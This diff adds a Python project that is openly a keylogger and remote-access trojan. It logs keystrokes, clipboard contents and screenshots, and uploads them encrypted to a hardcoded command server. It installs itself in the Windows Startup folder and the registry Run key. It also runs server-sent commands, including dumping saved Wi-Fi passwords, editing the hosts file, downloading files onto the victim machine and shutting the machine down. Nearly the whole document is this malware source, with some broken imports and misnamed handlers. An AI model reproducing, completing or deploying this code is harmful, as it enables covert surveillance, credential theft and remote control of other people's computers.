@@ -1,0 +1,867 @@
+Folder Structure:
+├── [DIR] commands
+    └── [FILE] handler.py
+├── [FILE] config.py
+├── [DIR] encryption
+    └── [FILE] manager.py
+├── [FILE] main.py
+├── [DIR] monitoring
+    └── [FILE] logger.py
+├── [DIR] network
+    └── [FILE] communicator.py
+├── [DIR] system
+    └── [FILE] collector.py
+└── [FILE] utils.py
+
+
+File Contents:
+----------------------------------------
+File: .\config.py
+----------------------------------------
+# ------------ config.py ------------
+import base64
+import os
+import platform
+import hashlib
+
+class Config:
+    # Connection Settings
+    SERVER_URL = "https://fasitheme.ir/logger/api.php/"
+    SECRET_TOKEN = "1"
+    CHECK_INTERVAL = 120  # seconds (data sync, e.g., keystrokes, system info)
+    COMMAND_POLL_INTERVAL = 20  # Increased from 10 to 60 seconds
+    COMMAND_TIMEOUT = 5  # seconds, for HTTP request timeout
+    
+    # Security Settings
+    ENCRYPTION_KEY = base64.b64decode("nTds2GHvEWeOGJibjZuaf8kY5T5YWyfMx4J3B1NA0Jo=")
+    IV_LENGTH = 16
+    BUFFER_LIMIT = 100000  # max keystrokes before flush
+    
+    # System Settings
+    EMERGENCY_HOTKEY = "ctrl+alt+shift+k"
+    ERROR_LOG_FILE = "errors.log"
+    MAX_ERROR_LOG_SIZE = 1024 * 1024  # 1MB
+    
+    @staticmethod
+    def get_client_id():
+        unique_str = f"{platform.node()}-{os.getlogin()}"
+        return hashlib.sha256(unique_str.encode()).hexdigest()[:32]
+
+----------------------------------------
+File: .\main.py
+----------------------------------------
+# ------------ main.py ------------
+import threading
+import time
+import json
+import logging
+import sys
+from datetime import datetime  # Explicitly ensure datetime is imported
+from keyboard import hook, add_hotkey
+from config import Config
+from encryption.manager import EncryptionManager, EncryptionError
+from network.communicator import ServerCommunicator, CommunicationError
+from system.collector import SystemCollector
+from commands.handler import CommandHandler, CommandError
+from monitoring.logger import ActivityLogger
+from PIL import Image
+import io
+import pyautogui
+
+class KeyloggerCore:
+    def __init__(self):
+        self.client_id = Config.get_client_id()
+        logging.info(f"Client ID: {self.client_id}")
+        self.encryption = EncryptionManager(Config.ENCRYPTION_KEY)
+        self.communicator = ServerCommunicator(self.client_id, self.encryption)
+        self.logger = ActivityLogger(Config.BUFFER_LIMIT)
+        self.running = True
+        self.add_to_startup()
+
+    def start(self):
+        self._init_hotkeys()
+        self._start_service_threads()
+        self._main_loop()
+
+    def add_to_startup(self):
+        import os
+        import shutil
+        import winreg
+        import platform
+
+        if platform.system().lower() != 'windows':
+            logging.info("Startup registration only supported on Windows")
+            return
+
+        try:
+            # Get the path to the executable
+            exe_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
+            exe_name = os.path.basename(exe_path)
+
+            # Option 1: Add to Startup folder
+            startup_folder = os.path.join(os.environ.get('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+            shortcut_path = os.path.join(startup_folder, f"{exe_name}.lnk")
+            if not os.path.exists(shortcut_path):
+                import win32com.client
+                shell = win32com.client.Dispatch("WScript.Shell")
+                shortcut = shell.CreateShortCut(shortcut_path)
+                shortcut.Targetpath = exe_path
+                shortcut.WorkingDirectory = os.path.dirname(exe_path)
+                shortcut.save()
+                logging.info(f"Added shortcut to Startup folder: {shortcut_path}")
+
+            # Option 2: Add to Registry
+            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
+                winreg.SetValueEx(key, "KeyloggerClient", 0, winreg.REG_SZ, exe_path)
+                logging.info("Added to registry startup")
+        except Exception as e:
+            logging.error(f"Failed to add to startup: {str(e)}")
+
+    def _init_hotkeys(self):
+        add_hotkey(Config.EMERGENCY_HOTKEY, self.emergency_stop)
+        hook(self.logger.log_keystroke)
+
+    def _start_service_threads(self):
+        threading.Thread(target=self._data_sync_loop, daemon=True).start()
+        threading.Thread(target=self._command_loop, daemon=True).start()
+        threading.Thread(target=self._clipboard_monitor_loop, daemon=True).start()
+
+    def _capture_screenshot(self):
+        try:
+            screenshot = pyautogui.screenshot()
+            img_byte_arr = io.BytesIO()
+            screenshot.save(img_byte_arr, format='PNG')
+            return img_byte_arr.getvalue()
+        except Exception as e:
+            self._handle_error(f"Screenshot capture error: {str(e)}")
+            return None
+
+    def _data_sync_loop(self):
+        while self.running:
+            try:
+                logging.info("Starting data sync...")
+                system_info = SystemCollector.collect_full()
+                logging.info(f"Collected system info: {system_info}")
+                screenshot = self._capture_screenshot()
+                self.communicator.upload_data(
+                    keystrokes=self.logger.buffer.copy(),
+                    system_info=system_info,
+                    screenshot=screenshot
+                )
+                logging.info("Data sync completed")
+                self.logger.buffer.clear()
+                logging.info(f"Sleeping for {Config.CHECK_INTERVAL} seconds")
+                time.sleep(Config.CHECK_INTERVAL)
+            except Exception as e:
+                self._handle_error(f"Sync error: {str(e)}")
+                logging.info("Sleeping for 5 seconds due to error")
+                time.sleep(5)  # Prevent rapid retries on failure
+
+    def _command_loop(self):
+        while self.running:
+            try:
+                logging.info("Fetching commands from server...")
+                commands = self.communicator.fetch_commands()
+                logging.info(f"Received {len(commands)} commands: {commands}")
+                if commands:
+                    self._process_commands(commands)
+                time.sleep(Config.COMMAND_POLL_INTERVAL)
+            except Exception as e:
+                self._handle_error(f"Command processing error: {str(e)}")
+                time.sleep(5)  # Prevent rapid retries on failure
+
+    def _clipboard_monitor_loop(self):
+        while self.running:
+            try:
+                self.logger.log_clipboard()
+                time.sleep(10)
+            except Exception as e:
+                self._handle_error(f"Clipboard monitor error: {str(e)}")
+
+    def _process_commands(self, commands):
+        for cmd in commands:
+            try:
+                logging.info(f"Processing command: ID={cmd['id']}, Type={cmd['type']}")
+                if not all(k in cmd for k in ('id', 'command', 'type')):
+                    raise CommandError(f"Invalid command structure: {cmd}")
+    
+                decrypted = self.encryption.decrypt(cmd['command'])
+                logging.info(f"Decrypted command: {decrypted}")
+                command_data = json.loads(decrypted)
+                logging.info(f"Parsed command data: {command_data}")
+                logging.info(f"Command received - Type: {command_data['type']}, Params: {command_data.get('params')}")
+    
+                if 'type' not in command_data:
+                    raise CommandError(f"Missing 'type' in decrypted command: {command_data}")
+    
+                if command_data['type'] == 'capture_screenshot':
+                    screenshot = self._capture_screenshot()
+                    if screenshot:
+                        result = {"screenshot": base64.b64encode(screenshot).decode()}
+                    else:
+                        raise CommandError("Failed to capture screenshot")
+                else:
+                    result = CommandHandler.execute(
+                        command_data['type'],
+                        command_data.get('params', {})
+                    )
+                logging.info(f"Command executed successfully: {command_data['type']}, Result: {result}")
+                self.communicator.send_command_result(cmd['id'], result)
+    
+            except (KeyError, json.JSONDecodeError) as e:
+                self._handle_error(f"Invalid command format: {str(e)}, Command: {cmd}")
+            except CommandError as e:
+                self._handle_error(f"Command error: {str(e)}, Command: {cmd}")
+            except Exception as e:
+                self._handle_error(f"Command execution failed: {str(e)}, Command: {cmd}")
+
+    def _handle_error(self, message):
+        logging.error(message)
+
+    def emergency_stop(self):
+        self.running = False
+        logging.info("Emergency stop activated")
+        sys.exit(0)
+
+    def _main_loop(self):
+        try:
+            while self.running:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            self.emergency_stop()
+
+if __name__ == "__main__":
+    logging.basicConfig(
+        filename=Config.ERROR_LOG_FILE,
+        level=logging.DEBUG,
+        format='%(asctime)s - %(levelname)s - %(message)s'
+    )
+    keylogger = KeyloggerCore()
+    keylogger.start()
+
+----------------------------------------
+File: .\utils.py
+----------------------------------------
+# utils.py
+class CommandError(Exception):
+    """Custom exception for command-related errors."""
+    pass
+
+----------------------------------------
+File: .\commands\handler.py
+----------------------------------------
+import json
+import subprocess
+import webbrowser
+import psutil
+import os
+import pyperclip
+from utils import CommandError
+
+class CommandHandler:
+    @staticmethod
+    def execute(command_type, params):
+        handlers = {
+            'system_info': CommandHandler.handle_system_info,
+            'file_operation': CommandHandler.handle_file_operation,
+            'system_command': CommandHandler.handle_system_command,
+            'process_management': CommandHandler.handle_process_management,
+            'capture_screenshot': CommandHandler.handle_screenshot,
+            'clipboard_history': CommandHandler.handle_clipboard_history,
+            'keystroke_history': CommandHandler.handle_keystroke_history,
+            'open_url': CommandHandler.handle_open_url,
+            'wifi_passwords': CommandHandler.handle_wifi_passwords,  # New handler
+            'edit_hosts': CommandHandler.handle_edit_hosts,
+            'upload_file': CommandHandler.handle_upload_file
+        }
+        handler = handlers.get(command_type)
+        if not handler:
+            raise CommandError(f"Unknown command type: {command_type}")
+        return handler(params)
+
+    @staticmethod
+    def handle_file_operation(params):
+        action = params.get('action')
+        path = params.get('path')
+
+        if not action or not path:
+            raise CommandError("Missing 'action' or 'path' parameters")
+
+        if action == 'list':
+            try:
+                files = os.listdir(path)
+                return {"files": files}
+            except Exception as e:
+                raise CommandError(f"Failed to list directory: {str(e)}")
+        elif action == 'upload':
+            # Implement file upload logic if needed
+            raise CommandError("Upload not implemented")
+        else:
+            raise CommandError(f"Unknown file operation: {action}")
+
+    @staticmethod
+    def handle_system_info(params):
+        import platform
+        import socket
+        disk = psutil.disk_usage('/')
+        return {
+            "os": platform.system(),
+            "version": platform.release(),
+            "architecture": platform.architecture(),
+            "hostname": socket.gethostname(),
+            "user": os.getlogin(),
+            "cpu_cores": psutil.cpu_count(),
+            "total_memory": psutil.virtual_memory().total,
+            "disk_usage": {
+                "total": disk.total,
+                "used": disk.used,
+                "free": disk.free,
+                "percent": disk.percent
+            },
+            "ip_address": socket.gethostbyname(socket.gethostname()),
+            "antivirus": "Windows Defender"  # Simplified for example
+        }
+
+    @staticmethod
+    def handle_system_command(params):
+        command = params.get('command')
+        if not command:
+            raise CommandError("Missing 'command' parameter")
+
+        import platform
+        system = platform.system().lower()
+
+        command_map = {
+            'windows': {
+                'shutdown': 'shutdown /s /t 0',
+                'restart': 'shutdown /r /t 0',
+                'sleep': 'rundll32.exe powrprof.dll,SetSuspendState 0,1,0',
+                'signout': 'logoff'
+            },
+            'linux': {
+                'shutdown': 'sudo shutdown -h now',
+                'restart': 'sudo reboot',
+                'sleep': 'sudo pm-suspend',
+                'signout': 'pkill -u $USER'
+            },
+            'darwin': {  # macOS
+                'shutdown': 'sudo shutdown -h now',
+                'restart': 'sudo shutdown -r now',
+                'sleep': 'pmset sleepnow',
+                'signout': 'osascript -e \'tell app "System Events" to log out\''
+            }
+        }
+
+        if system not in command_map or command not in command_map[system]:
+            raise CommandError(f"Command '{command}' not supported on {system}")
+
+        shell_command = command_map[system][command]
+        try:
+            result = subprocess.run(shell_command, shell=True, capture_output=True, text=True, timeout=30)
+            return {"stdout": result.stdout, "stderr": result.stderr, "returncode": result.returncode}
+        except subprocess.SubprocessError as e:
+            raise CommandError(f"Failed to execute system command: {str(e)}")
+
+    @staticmethod
+    def handle_process_management(params):
+        action = params.get('action')
+        if not action:
+            raise CommandError("Missing 'action' parameter")
+        if action == 'list':
+            processes = [{"pid": p.pid, "name": p.name()} for p in psutil.process_iter(['pid', 'name'])]
+            return {"processes": processes}
+        else:
+            raise CommandError(f"Unknown process management action: {action}")
+
+    @staticmethod
+    def handle_keystroke_history(params):
+        raise CommandError("Keystroke history not implemented")  # Requires ActivityLogger implementation
+
+    @staticmethod
+    def handle_clipboard_history(params):
+        raise CommandError("Clipboard history not implemented")  # Requires ActivityLogger implementation
+
+    @staticmethod
+    def handle_capture_screenshot(params):
+        from main import KeyloggerCore
+        keylogger = KeyloggerCore()
+        screenshot = keylogger._capture_screenshot()
+        if screenshot:
+            import base64
+            return {"screenshot": base64.b64encode(screenshot).decode()}
+        raise CommandError("Failed to capture screenshot")
+
+    @staticmethod
+    def handle_open_url(params):
+        url = params.get('url')
+        if not url:
+            raise CommandError("Missing 'url' parameter")
+        webbrowser.open(url)
+        return {"status": "success"}
+
+    @staticmethod
+    def handle_raw_command(params):
+        command = params.get('command')
+        if not command:
+            raise CommandError("Missing 'command' parameter")
+        try:
+            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
+            return {"stdout": result.stdout, "stderr": result.stderr, "returncode": result.returncode}
+        except subprocess.SubprocessError as e:
+            raise CommandError(f"Failed to execute raw command: {str(e)}")
+
+    @staticmethod
+    def handle_wifi_passwords(params):
+        import subprocess
+        import re
+        import platform
+    
+        if platform.system().lower() != 'windows':
+            raise CommandError("Wi-Fi password retrieval is only supported on Windows")
+    
+        try:
+            # Get list of Wi-Fi profiles
+            result = subprocess.run(
+                'netsh wlan show profiles',
+                shell=True,
+                capture_output=True,
+                text=True,
+                timeout=30
+            )
+            if result.returncode != 0:
+                raise CommandError(f"Failed to get Wi-Fi profiles: {result.stderr}")
+    
+            # Extract profile names
+            profiles = re.findall(r'All User Profile\s*:\s*(.+)', result.stdout)
+            wifi_data = []
+    
+            for profile in profiles:
+                profile = profile.strip()
+                # Get password for each profile
+                result = subprocess.run(
+                    f'netsh wlan show profile name="{profile}" key=clear',
+                    shell=True,
+                    capture_output=True,
+                    text=True,
+                    timeout=30
+                )
+                if result.returncode != 0:
+                    continue  # Skip profiles that fail (e.g., no password)
+    
+                # Extract SSID and password
+                ssid_match = re.search(r'SSID name\s*:\s*"(.+)"', result.stdout)
+                password_match = re.search(r'Key Content\s*:\s*(.+)', result.stdout)
+                ssid = ssid_match.group(1) if ssid_match else profile
+                password = password_match.group(1) if password_match else "N/A"
+    
+                wifi_data.append({"ssid": ssid, "password": password})
+    
+            return {"wifi_passwords": wifi_data}
+        except Exception as e:
+            logging.error(f"Failed to retrieve Wi-Fi passwords: {str(e)}")
+            raise CommandError(f"Failed to retrieve Wi-Fi passwords: {str(e)}")
+
+    @staticmethod
+    def handle_edit_hosts(params):
+        import os
+        import platform
+
+        if platform.system().lower() != 'windows':
+            raise CommandError("Hosts file editing is only supported on Windows")
+
+        action = params.get('action')  # 'add', 'remove', 'list'
+        host_entry = params.get('host_entry')  # e.g., "127.0.0.1 example.com"
+        hosts_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'drivers', 'etc', 'hosts')
+
+        try:
+            if action == 'list':
+                with open(hosts_path, 'r', encoding='utf-8') as f:
+                    content = f.read()
+                return {"hosts_content": content}
+            elif action == 'add':
+                if not host_entry:
+                    raise CommandError("Missing host_entry for add action")
+                with open(hosts_path, 'a', encoding='utf-8') as f:
+                    f.write(f"\n{host_entry}")
+                return {"status": "success", "message": f"Added {host_entry} to hosts file"}
+            elif action == 'remove':
+                if not host_entry:
+                    raise CommandError("Missing host_entry for remove action")
+                with open(hosts_path, 'r', encoding='utf-8') as f:
+                    lines = f.readlines()
+                with open(hosts_path, 'w', encoding='utf-8') as f:
+                    removed = False
+                    for line in lines:
+                        if line.strip() != host_entry.strip():
+                            f.write(line)
+                        else:
+                            removed = True
+                    return {"status": "success", "message": f"Removed {host_entry} from hosts file" if removed else f"Entry {host_entry} not found"}
+            else:
+                raise CommandError(f"Unknown hosts action: {action}")
+        except PermissionError:
+            logging.error("Permission denied when editing hosts file")
+            raise CommandError("Permission denied: Run client as Administrator")
+        except Exception as e:
+            logging.error(f"Failed to edit hosts file: {str(e)}")
+            raise CommandError(f"Failed to edit hosts file: {str(e)}")
+
+
+    @staticmethod
+    def handle_upload_file(params):
+        import requests
+        import os
+        import urllib.parse
+
+        source = params.get('source')  # 'url' or 'telegram'
+        file_url = params.get('file_url')  # URL or Telegram file path
+        dest_path = params.get('dest_path')  # Destination path on target
+
+        if not source or not file_url or not dest_path:
+            raise CommandError("Missing source, file_url, or dest_path")
+
+        try:
+            dest_dir = os.path.dirname(dest_path)
+            if dest_dir and not os.path.exists(dest_dir):
+                os.makedirs(dest_dir)
+
+            if source == 'url':
+                response = requests.get(file_url, stream=True, timeout=30)
+                if response.status_code != 200:
+                    raise CommandError(f"Failed to download file from URL: HTTP {response.status_code}")
+                with open(dest_path, 'wb') as f:
+                    for chunk in response.iter_content(chunk_size=8192):
+                        f.write(chunk)
+            elif source == 'telegram':
+                # Assume file_url is a Telegram file_id
+                telegram_bot_token = Config.TELEGRAM_BOT_TOKEN  # Add to config.py
+                file_info_url = f"https://api.telegram.org/bot{telegram_bot_token}/getFile?file_id={file_url}"
+                file_info = requests.get(file_info_url, timeout=30).json()
+                if not file_info.get('ok'):
+                    raise CommandError(f"Failed to get Telegram file info: {file_info.get('description')}")
+                file_path = file_info['result']['file_path']
+                file_download_url = f"https://api.telegram.org/file/bot{telegram_bot_token}/{file_path}"
+                response = requests.get(file_download_url, stream=True, timeout=30)
+                if response.status_code != 200:
+                    raise CommandError(f"Failed to download Telegram file: HTTP {response.status_code}")
+                with open(dest_path, 'wb') as f:
+                    for chunk in response.iter_content(chunk_size=8192):
+                        f.write(chunk)
+            else:
+                raise CommandError(f"Unknown source: {source}")
+
+            return {"status": "success", "message": f"File uploaded to {dest_path}"}
+        except requests.RequestException as e:
+            logging.error(f"Network error during file upload: {str(e)}")
+            raise CommandError(f"Network error: Failed to download file ({str(e)})")
+        except Exception as e:
+            logging.error(f"Failed to upload file: {str(e)}")
+            raise CommandError(f"Failed to upload file: {str(e)}")
+
+----------------------------------------
+File: .\encryption\manager.py
+----------------------------------------
+# ------------ encryption/manager.py ------------
+import base64
+import hashlib
+import os  # Added import
+from cryptography.hazmat.primitives import padding
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from config import Config
+import logging  # Added for debugging
+
+class EncryptionManager:
+    def __init__(self, encryption_key):
+        self.key = encryption_key
+        self._validate_key()
+
+    def _validate_key(self):
+        if len(self.key) != 32:
+            raise ValueError("Encryption key must be 32 bytes")
+
+    def encrypt(self, plaintext):
+        try:
+            logging.info("Starting encryption")
+            iv = os.urandom(Config.IV_LENGTH)
+            cipher = Cipher(algorithms.AES(self.key), modes.CBC(iv), backend=default_backend())
+            encryptor = cipher.encryptor()
+            
+            padder = padding.PKCS7(128).padder()
+            padded_data = padder.update(plaintext.encode()) + padder.finalize()
+            
+            ciphertext = encryptor.update(padded_data) + encryptor.finalize()
+            result = f"{base64.b64encode(ciphertext).decode()}::{base64.b64encode(iv).decode()}"
+            logging.info("Encryption successful")
+            return result
+        except Exception as e:
+            logging.error(f"Encryption failed: {str(e)}")
+            raise EncryptionError(f"Encryption failed: {str(e)}")
+
+    def decrypt(self, encrypted_data):
+        try:
+            logging.info("Starting decryption")
+            ciphertext_b64, iv_b64 = encrypted_data.split('::')
+            ciphertext = base64.b64decode(ciphertext_b64)
+            iv = base64.b64decode(iv_b64)
+            
+            cipher = Cipher(algorithms.AES(self.key), modes.CBC(iv), backend=default_backend())
+            decryptor = cipher.decryptor()
+            
+            decrypted = decryptor.update(ciphertext) + decryptor.finalize()
+            
+            unpadder = padding.PKCS7(128).unpadder()
+            result = (unpadder.update(decrypted) + unpadder.finalize()).decode()
+            logging.info("Decryption successful")
+            return result
+        except Exception as e:
+            logging.error(f"Decryption failed: {str(e)}")
+            raise EncryptionError(f"Decryption failed: {str(e)}")
+
+class EncryptionError(Exception):
+    pass
+
+----------------------------------------
+File: .\monitoring\logger.py
+----------------------------------------
+# ------------ monitoring/logger.py ------------
+from datetime import datetime
+import pyperclip
+import logging
+
+class ActivityLogger:
+    def __init__(self, buffer_limit):
+        self.buffer = []
+        self.buffer_limit = buffer_limit
+
+    def log_keystroke(self, event):
+        if event.event_type == 'down':
+            self.buffer.append(event.name)
+            if len(self.buffer) >= self.buffer_limit:
+                self.flush_buffer()
+
+    def log_clipboard(self):
+        try:
+            content = pyperclip.paste()[:1000]
+            if content:
+                self.buffer.append(f"[CLIPBOARD]{content}")
+        except Exception as e:
+            logging.error(f"Clipboard monitoring error: {str(e)}")
+
+    def flush_buffer(self):
+        if self.buffer:
+            try:
+                from system.collector import SystemCollector
+                from network.communicator import ServerCommunicator
+                
+                system_info = SystemCollector.collect_full()
+                # ارسال داده‌های کیلاگر
+                ServerCommunicator.upload_data(
+                    keystrokes=self.buffer.copy(),
+                    system_info=system_info
+                )
+                self.buffer.clear()
+            except Exception as e:
+                logging.error(f"Failed to upload data: {str(e)}")
+
+----------------------------------------
+File: .\network\communicator.py
+----------------------------------------
+# ------------ network/communicator.py ------------
+import requests
+import json
+import logging  # Added import
+from config import Config
+import warnings
+warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
+
+class ServerCommunicator:
+    def __init__(self, client_id, encryption_manager):
+        self.client_id = client_id
+        self.encryption = encryption_manager
+
+    def _send_request(self, endpoint, data=None, files=None):
+        try:
+            endpoint = endpoint.lstrip('?/')
+            base_url = Config.SERVER_URL.rstrip('/')
+            url = f"{base_url}/{endpoint}"
+            response = requests.post(
+                url,
+                data=data,
+                files=files,
+                verify=False,
+                timeout=Config.COMMAND_TIMEOUT,
+                proxies={'http': None, 'https': None}
+            )
+            return self._handle_response(response)
+        except requests.exceptions.RequestException as e:
+            raise CommunicationError(f"Connection error: {str(e)}")
+
+    def _handle_response(self, response):
+        if response.status_code == 200:
+            try:
+                data = response.json()
+
+                # اعتبارسنجی ساختار پاسخ سرور
+                if not isinstance(data, dict) or 'commands' not in data:
+                    raise CommunicationError("Invalid response format: Missing 'commands' key")
+
+                if not isinstance(data['commands'], list):
+                    raise CommunicationError("Invalid commands format: Expected list")
+
+                return data['commands']
+
+            except json.JSONDecodeError:
+                raise CommunicationError("Invalid JSON response")
+
+        else:
+            raise CommunicationError(f"Server error: {response.status_code}")
+
+    def upload_data(self, keystrokes, system_info, screenshot=None):
+        try:
+            encrypted_data = {
+                "action": "upload_data",
+                "client_id": self.client_id,
+                "token": Config.SECRET_TOKEN,
+                "keystrokes": self.encryption.encrypt(' '.join(keystrokes)),
+                "system_info": self.encryption.encrypt(json.dumps(system_info))
+            }
+    
+            files = {}
+            if screenshot:
+                files['screenshot'] = ('screenshot.png', screenshot, 'image/png')
+    
+            response = requests.post(
+                Config.SERVER_URL,
+                data=encrypted_data,
+                files=files,
+                timeout=Config.COMMAND_TIMEOUT,
+                verify=False
+            )
+            
+            if response.status_code != 200:
+                raise CommunicationError(f"Upload failed: {response.text}")
+                
+        except Exception as e:
+            raise CommunicationError(f"Upload error: {str(e)}")
+
+    def fetch_commands(self):
+        try:
+            response = self._send_request(
+                "?action=get_commands",  # افزودن action به URL
+                data={
+                    "action": "get_commands",
+                    "client_id": self.client_id,
+                    "token": Config.SECRET_TOKEN
+                }
+            )
+
+            logging.info(f"Raw server response for commands: {response}")
+
+            # اعتبارسنجی ساختار پاسخ
+            if not isinstance(response, list):
+                raise CommunicationError(f"Invalid commands format: {response}")
+
+            validated_commands = []
+            for cmd in response:
+                # بررسی وجود فیلدهای ضروری
+                if not all(k in cmd for k in ('id', 'command')):
+                    logging.warning(f"Skipping invalid command: {cmd}")
+                    continue
+
+                try:
+                    # رمزگشایی دستور برای بررسی فیلد type
+                    decrypted = self.encryption.decrypt(cmd['command'])
+                    command_data = json.loads(decrypted)
+
+                    if 'type' not in command_data:
+                        logging.error(f"Command missing 'type': {command_data}")
+                        continue
+
+                    # افزودن فیلد type به دستور
+                    cmd['type'] = command_data['type']
+                    validated_commands.append(cmd)
+
+                except Exception as e:
+                    logging.error(f"Command validation failed: {str(e)}")
+
+            return validated_commands
+
+        except Exception as e:
+            raise CommunicationError(f"Failed to process commands: {str(e)}")
+
+    def send_command_result(self, command_id, result):
+        logging.info(f"Sending command result for ID {command_id}: {result}")
+        return self._send_request(
+            "command_response",
+            data={
+                "command_id": command_id,
+                "result": self.encryption.encrypt(json.dumps(result)),
+                "token": Config.SECRET_TOKEN
+            }
+        )
+
+class CommunicationError(Exception):
+    pass
+
+----------------------------------------
+File: .\system\collector.py
+----------------------------------------
+# ------------ system/collector.py ------------
+import platform
+import psutil
+import winreg
+import os
+import requests
+from config import Config
+from datetime import datetime  # Ensure this is present
+import logging  # Add for debugging
+
+class SystemCollector:
+    @staticmethod
+    def get_platform_info():
+        return {
+            "os": platform.system(),
+            "version": platform.version(),
+            "architecture": platform.architecture(),
+            "hostname": platform.node(),
+            "user": os.getlogin()
+        }
+
+    @staticmethod
+    def get_hardware_info():
+        return {
+            "cpu_cores": os.cpu_count(),
+            "total_memory": psutil.virtual_memory().total,
+            "disk_usage": psutil.disk_usage('/')._asdict()
+        }
+
+    @staticmethod
+    def get_network_info():
+        try:
+            return {
+                "ip_address": requests.get('https://fasitheme.ir/ip.php', timeout=5).text,
+                "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)])
+            }
+        except:
+            return {"ip_address": "unknown"}
+
+    @staticmethod
+    def get_security_info():
+        try:
+            winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows Defender")
+            return {"antivirus": "Windows Defender"}
+        except:
+            return {"antivirus": "Unknown"}
+
+    @staticmethod
+    def collect_full():
+        logging.info("Collecting system info with datetime")  # Debug log
+        return {
+            **SystemCollector.get_platform_info(),
+            **SystemCollector.get_hardware_info(),
+            **SystemCollector.get_network_info(),
+            **SystemCollector.get_security_info(),
+            "timestamp": datetime.now().isoformat()
+        }
